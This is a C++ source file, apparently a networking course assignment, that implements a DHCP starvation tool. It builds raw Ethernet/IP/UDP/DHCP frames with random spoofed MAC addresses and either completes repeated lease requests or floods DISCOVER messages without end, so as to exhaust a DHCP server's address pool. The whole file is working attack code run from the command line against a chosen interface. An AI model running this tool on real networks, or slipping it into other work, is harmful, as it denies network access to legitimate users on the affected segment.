//autor: Erik Kelemen

#include "ipk-dhcpstarve.h"


	//public:
	dhcp_request_generator::dhcp_request_generator(int argc, char * const argv[], const char *optstring)
	{
        parse_arguments(argc, argv, optstring);

		create_listen_socket();
		create_send_socket();
	}
	dhcp_request_generator::~dhcp_request_generator()
	{
		close(dhcp_socket_send);
		close(dhcp_socket_listen);
	}

	void dhcp_request_generator::parse_arguments(int argc, char * const argv[], const char *optstring)
	{
		interface = NULL;
		int opt;
		while ((opt = getopt(argc, argv, optstring)) != -1) {
		switch (opt) {
			case 'i':
				interface = optarg;
				break;
			default: /* '?' */
				std::cerr << "Usage: -i interface" << std::endl;
				exit(EXIT_FAILURE);
			}
		}
		if (interface == NULL)
		{
			std::cerr << "Usage: -i interface" << std::endl;
			exit(EXIT_FAILURE);
		}
	}

	bool dhcp_request_generator::beg_for_IP()
	{

		std::srand(time(NULL));	//random seed

		//while(42)
		//uint8_t fake_MAC0 = std::rand();
		uint8_t fake_MAC1 = std::rand();
		uint8_t fake_MAC2 = std::rand();
		uint8_t fake_MAC3 = std::rand();
		uint8_t fake_MAC4 = std::rand();
		uint8_t fake_MAC5 = std::rand();

		std::srand(time(NULL));	//random seed
		uint32_t rand_xid = std::rand();

		ethernet_frame main_frame = ethernet_frame();
		main_frame.set_dest_mac(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);	//broadcast
		//main_frame.set_source_mac(0xe4, 0xb3, 0x18, 0x82, 0x0e, 0xbf);	//fake MAC addr
		main_frame.set_source_mac(0x00, fake_MAC1, fake_MAC2, fake_MAC3, fake_MAC4, fake_MAC5);
		//main_frame.set_source_mac(0x00, fake_MAC1, fake_MAC2, fake_MAC3, fake_MAC4, fake_MAC5);	//fake MAC addr
		IPv4 ip_part = IPv4();
		ip_part.set_TTL(253);
		ip_part.set_total_length(271);
		ip_part.calculate_checksum();
		udp udp_part = udp();
		udp_part.set_length(271);
		udp_part.set_source_port(68);
		udp_part.set_dest_port(67);
		dhcp dhcp_part = dhcp();
		dhcp_part.set_xid(rand_xid);
		dhcp_part.set_chaddr_MAC(0x00, fake_MAC1, fake_MAC2, fake_MAC3, fake_MAC4, fake_MAC5);
		//dhcp_part.set_chaddr_MAC(0x00, fake_MAC1, fake_MAC2, fake_MAC3, fake_MAC4, fake_MAC5);
		main_frame.load_IPv4(ip_part);
		main_frame.load_udp(udp_part);
		main_frame.load_dhcp(dhcp_part);

		write(dhcp_socket_send, main_frame.get_ptr(), 305);
		//sstd::cout << (int)main_frame.get_frame_size();

		struct sockaddr_in remaddr; /* remote address */ 
		socklen_t addrlen = sizeof(remaddr); /* length of addresses */


		unsigned int control_check = 0;
		while(42)
		{
			if (control_check >= 5)
				return false;

			time_out.tv_sec = 5;	//5 seconds
			time_out.tv_usec = 0;
			FD_ZERO(&rfds);
			FD_SET(dhcp_socket_listen, &rfds);	//for select later on
			int retval = select(dhcp_socket_listen+1, &rfds, NULL, NULL, &time_out);
			if (retval == -1)
			{
            	perror("ERROR select");
            	exit(EXIT_FAILURE);
			}
			else if (retval)
			{
            	//available data
            	char BUFFER[516];
            	struct dhcp_data * ptr_dhcp = reinterpret_cast<struct dhcp_data *>(BUFFER);
            	int recvlen = recvfrom(dhcp_socket_listen, &BUFFER, 516, 0, (struct sockaddr *)&remaddr, &addrlen);
            	if (recvlen > 248 && ptr_dhcp->xid == htonl(rand_xid) && (ptr_dhcp->options[0] == 0x63) && (ptr_dhcp->options[4] == 53) && (ptr_dhcp->options[5] == 1) && (ptr_dhcp->options[6] == 2))
            	{
            		dhcp_part.create_request_msg(rand_xid, ptr_dhcp->yiaddr);
            		dhcp_part.set_chaddr_MAC(0x00, fake_MAC1, fake_MAC2, fake_MAC3, fake_MAC4, fake_MAC5);
            		main_frame.load_dhcp(dhcp_part);

            		write(dhcp_socket_send, main_frame.get_ptr(), 305);
            		return true;
            	}
            	else
            	{
            		control_check++;
            		continue;
            	}
			}
           else
           {
           		//fail no data after 5 sec
               return false;
           }
		}
		return true;
	}

	//void dhcp_request_generator::create_dhcp_sockets();
	void dhcp_request_generator::create_send_socket()
	{

		dhcp_socket_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));	//layer 2

		struct ifreq ifr;
		strncpy(ifr.ifr_name, interface, IFNAMSIZ);

		if (ioctl(dhcp_socket_send, SIOCGIFINDEX, &ifr) < 0)
		{
			perror("ioctl SIOCGIFINDEX");
			exit(1);
		}
		
		struct sockaddr_ll saddr;
		//bzero(&saddr, sizeof(struct sockaddr_ll));
		saddr.sll_family = AF_PACKET;
		saddr.sll_protocol = htons(ETH_P_ALL);
		saddr.sll_ifindex = ifr.ifr_ifindex;

		if (bind(dhcp_socket_send, (struct sockaddr *)(&saddr), sizeof(saddr)) < 0)
		{
			perror("ERROR bind");
			exit(1);
		}
	}

	void dhcp_request_generator::create_listen_socket()
	{
		if ((dhcp_socket_listen = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
		{
			perror("ERROR socket");
			exit(EXIT_FAILURE);
		}

		struct sockaddr_in myaddr;

		memset(&myaddr, 0, sizeof(myaddr));
		myaddr.sin_family = AF_INET;
		myaddr.sin_addr.s_addr = htonl(INADDR_ANY);
		myaddr.sin_port = htons(68);

		int reuse_flag;

		if (setsockopt(dhcp_socket_listen, SOL_SOCKET, SO_REUSEADDR, &reuse_flag, sizeof(int)) < 0)
		{
			perror("ERROR SO_REUSEADDR)");
			exit(EXIT_FAILURE);
		}

		if (bind(dhcp_socket_listen, (struct sockaddr *)(&myaddr), sizeof(myaddr)) < 0)
		{
			perror("ERROR bind");
			exit(1);
		}
	}

	void dhcp_request_generator::spam_DHCP_DISCOVERY()
	{
		std::srand(time(NULL));	//random seed

		while(42)
		{

			//uint8_t fake_MAC0 = std::rand();
			uint8_t fake_MAC1 = std::rand();
			uint8_t fake_MAC2 = std::rand();
			uint8_t fake_MAC3 = std::rand();
			uint8_t fake_MAC4 = std::rand();
			uint8_t fake_MAC5 = std::rand();

			std::srand(time(NULL));	//random seed
			uint32_t rand_xid = std::rand();	//random id

			//create discovery msg from ethernet frame up to dhcp
			ethernet_frame main_frame = ethernet_frame();
			main_frame.set_dest_mac(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);	//broadcast
			main_frame.set_source_mac(0x00, fake_MAC1, fake_MAC2, fake_MAC3, fake_MAC4, fake_MAC5);	//fake MAC addr
			IPv4 ip_part = IPv4();
			ip_part.set_TTL(253);
			ip_part.set_total_length(271);
			ip_part.calculate_checksum();
			udp udp_part = udp();
			udp_part.set_length(271);
			udp_part.set_source_port(68);
			udp_part.set_dest_port(67);
			dhcp dhcp_part = dhcp();
			dhcp_part.create_discover_msg(rand_xid);
			dhcp_part.set_chaddr_MAC(0x00, fake_MAC1, fake_MAC2, fake_MAC3, fake_MAC4, fake_MAC5);
	
			//commit to main_frame
			main_frame.load_IPv4(ip_part);
			main_frame.load_udp(udp_part);
			main_frame.load_dhcp(dhcp_part);

			write(dhcp_socket_send, main_frame.get_ptr(), 305);	//send one packet
		}
	}

int main(int argc, char const *argv[])
{
	dhcp_request_generator IP_requester = dhcp_request_generator(argc, const_cast<char * const *>(argv), "i:");
	
	// Variant 2
	unsigned int error_tolerance = 0;
	while(42)
	{
		if (error_tolerance >=5)
			break;

		if (IP_requester.beg_for_IP() == false)
			error_tolerance++;
	}
	

	//IP_requester.spam_DHCP_DISCOVERY(); //variant 1
	
	return 0;
}
